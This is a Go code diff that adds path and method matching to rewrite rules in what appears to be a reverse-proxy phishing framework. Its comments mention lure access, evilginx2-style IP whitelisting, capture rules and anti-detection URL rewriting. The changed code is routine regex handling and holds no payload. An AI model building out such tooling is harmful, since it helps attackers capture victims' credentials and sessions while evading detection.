@@ -160,7 +160,7 @@ func GetValidProxyVariableNames() []string {
 // - "public": Allow all traffic (traditional proxy mode) - on_deny is ignored
 // - "private": Strict IP-based mode like evilginx2 - whitelist IP after lure access, deny all others (DEFAULT)
 
-// CompilePathPatterns compiles regex patterns for all capture and response rules
+// CompilePathPatterns compiles regex patterns for all capture, response, and rewrite rules
 func CompilePathPatterns(config *ProxyServiceConfigYAML) error {
 	// Compile global capture rule patterns
 	if config.Global != nil && config.Global.Capture != nil {
@@ -175,6 +175,15 @@ func CompilePathPatterns(config *ProxyServiceConfigYAML) error {
 	if config.Global != nil && config.Global.Response != nil {
 		for i := range config.Global.Response {
 			if err := compileResponsePath(&config.Global.Response[i]); err != nil {
+				return err
+			}
+		}
+	}
+
+	// Compile global rewrite rule patterns
+	if config.Global != nil && config.Global.Rewrite != nil {
+		for i := range config.Global.Rewrite {
+			if err := compileRewritePath(&config.Global.Rewrite[i]); err != nil {
 				return err
 			}
 		}
@@ -200,6 +209,30 @@ func CompilePathPatterns(config *ProxyServiceConfigYAML) error {
 				}
 			}
 		}
+	}
+
+	// Compile host-specific rewrite rule patterns
+	for _, hostConfig := range config.Hosts {
+		if hostConfig != nil && hostConfig.Rewrite != nil {
+			for i := range hostConfig.Rewrite {
+				if err := compileRewritePath(&hostConfig.Rewrite[i]); err != nil {
+					return err
+				}
+			}
+		}
+	}
+
+	return nil
+}
+
+// compileRewritePath compiles the path pattern for a rewrite rule
+func compileRewritePath(rule *ProxyServiceReplaceRule) error {
+	if rule.Path != "" {
+		pathRe, err := regexp.Compile(rule.Path)
+		if err != nil {
+			return fmt.Errorf("invalid regex pattern for rewrite path '%s': %w", rule.Path, err)
+		}
+		rule.PathRe = pathRe
 	}
 	return nil
 }
@@ -275,13 +308,16 @@ func (c *ProxyServiceCaptureRule) GetFindAsString() string {
 
 // ProxyServiceReplaceRule represents a replacement rule
 type ProxyServiceReplaceRule struct {
-	Name    string `yaml:"name,omitempty"`
-	Engine  string `yaml:"engine,omitempty"`  // "regex" (default) or "dom"
-	Find    string `yaml:"find,omitempty"`    // regex pattern (regex engine) or css selector (dom engine)
-	Replace string `yaml:"replace,omitempty"` // replacement value for both engines
-	Action  string `yaml:"action,omitempty"`  // dom action: setText, setHtml, setAttr, removeAttr, addClass, removeClass, remove
-	Target  string `yaml:"target,omitempty"`  // target matching: "first", "last", "all" (default), "1,3,5", "2-4"
-	From    string `yaml:"from,omitempty"`
+	Name    string         `yaml:"name,omitempty"`
+	Engine  string         `yaml:"engine,omitempty"`  // "regex" (default) or "dom"
+	Find    string         `yaml:"find,omitempty"`    // regex pattern (regex engine) or css selector (dom engine)
+	Replace string         `yaml:"replace,omitempty"` // replacement value for both engines
+	Action  string         `yaml:"action,omitempty"`  // dom action: setText, setHtml, setAttr, removeAttr, addClass, removeClass, remove
+	Target  string         `yaml:"target,omitempty"`  // target matching: "first", "last", "all" (default), "1,3,5", "2-4"
+	From    string         `yaml:"from,omitempty"`
+	Path    string         `yaml:"path,omitempty"`   // regex pattern to restrict rule to matching request paths
+	Method  string         `yaml:"method,omitempty"` // restrict rule to this HTTP method (e.g. GET, POST)
+	PathRe  *regexp.Regexp `yaml:"-"`                // compiled regex for path matching
 }
 
 // ProxyServiceURLRewriteRule represents a URL rewrite rule for anti-detection
